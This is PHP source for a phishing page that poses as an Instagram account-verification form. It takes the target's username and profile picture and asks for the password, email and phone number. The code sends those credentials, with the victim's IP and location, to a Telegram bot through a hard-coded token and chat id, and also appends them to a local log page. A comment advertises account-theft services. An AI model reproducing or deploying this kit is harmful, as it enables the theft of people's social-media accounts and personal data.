<?php

    //Aşağıdaki Kodları Sakın Ellemeyin , Ellerseniz Kodlar Bozulur !

error_reporting(E_ALL);
require 'slokerapi.php';
session_start();


$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $slokerpass=$_POST["slokerpass"];
    $slokermail=$_POST["slokermail"];
    $slokertel=$_POST["slokertel"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    //Telegram Bot Ayarları 
    $token = "5264087994:AAFxravtQZUoEZaNZm_jUujaACXLnCicSsk"; // Tokeni Kendi Botunuzun Tokeni İle Değiştirin !
 
    $parametre= array(
    'chat_id' => "-1001776028780", // Chat İd Kendi Botunuzun  Chat İd İle Değiştirin
    'text' => "Birinci Giriş Sayfası Bilgileri 

    Kullanıcı Adı : $username
    Şifre : $slokerpass
    Telefon Numarası : $slokermail
    Mail Adresi : $slokertel
    İp : $ip
    Devlet: $ulke
    Link : instagram.com/$username"
    
    );
    $ch = curl_init();
    $url = "https://api.telegram.org/bot".$token."/sendmessage";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
 
  $file = fopen('shutterlook.php', 'a');
   fwrite($file, "
 <html>
 <head>
     <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'>
 <title>Log | <?php echo date('d.m.Y H:i:s') ?></title>
 </head>
 <body bgcolor='#000000'>
 <body bgcolor='rgb(0,0,0)'>
 <body bgcolor='black'>
 <font color='red'>  Script Birinci Sayfa Bilgileri  </font><br>
 <font color='red'> Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
 <font color='red'> Şifre : </font><font color='white'>".$slokerpass."</font><br>
  <font color='red'> Mail Adresi : </font><font color='white'>".$slokermail."</font><br>
   <font color='red'> Telefon Numarası : </font><font color='white'>".$slokertel."</font><br>
 <font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
 <font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
 <font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
 <font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
 "); 
  
 fclose($file);
 
 echo '';
 
    header("Location: wrongpassword.php?username=$username");
 }
  
/*  
######  ##     ## ##     ## ######## ######## ######## ########  ##        #######   #######  ##    ## 
##    ## ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##   ##  
##       ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##  ##   
 ######  ######### ##     ##    ##       ##    ######   ########  ##       ##     ## ##     ## #####    
      ## ##     ## ##     ##    ##       ##    ##       ##   ##   ##       ##     ## ##     ## ##  ##   
##    ## ##     ## ##     ##    ##       ##    ##       ##    ##  ##       ##     ## ##     ## ##   ##  
 ######  ##     ##  #######     ##       ##    ######## ##     ## ########  #######   #######  ##    ## 
 
 CoDeR by SHuTTeRLooK
 İstediğiniz tarzda hertürlü script bulunur
 Sıfırdan yapılır.
 Hesap kapatma - açma işlemleri - takipçi işlemleri 
 Hesap Çalma - Çalınan hesabı kurtarma
 Yüksek Takipçi Hesaplar İçin 
 https://www.instagram.com/shuterlook/
 t.me/shutterlook
 Ulaşabilirsiniz
*/
?>


<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <title>Login  @<?php echo $username; ?></title>
    <link rel="icon" type="image/png" href="favicon.png"/>
    
    <link rel="stylesheet" href="sloker/main.css">

</head>

<body>
    <div class="container">

        <form class="form" method="post" >
            <br><br><br>
<center>
   <img style="max-width:50%;  border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>">
</center>
            <h1 class="form__title">    @<?php echo $username; ?></h1>
           <center> <p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
Dear <font color="red">@<?php echo $username; ?></font> , Enter the correct information to verify your account belongs to you.
</p></center>
<br>
            <div class="form__input-group">

                <input type="password" name="slokerpass" class="form__input" placeholder="Password">
                <div class="form__input-error-message"></div>

            </div>

            <div class="form__input-group">

                <input type="email" name="slokermail" class="form__input" placeholder="E-Mail Adress">
                <div class="form__input-error-message"></div>

            </div>

            <div class="form__input-group">

                <input type="number" name="slokertel" class="form__input" placeholder="Phone Number">
                <div class="form__input-error-message"></div>

            </div>
           
            <button class="form__button"  type="submit" >Login @<?php echo $username; ?></button>

            <p class="form__text"><?php include 'sloker/img/font.php'; ?>
                <a href="https://www.instagram.com/accounts/password/reset/" class="form__link">Forgot your password?</a>
            </p>

           
        </form>

    </div>

    <script src="sloker/main.js"></script>
 
</body>


</html>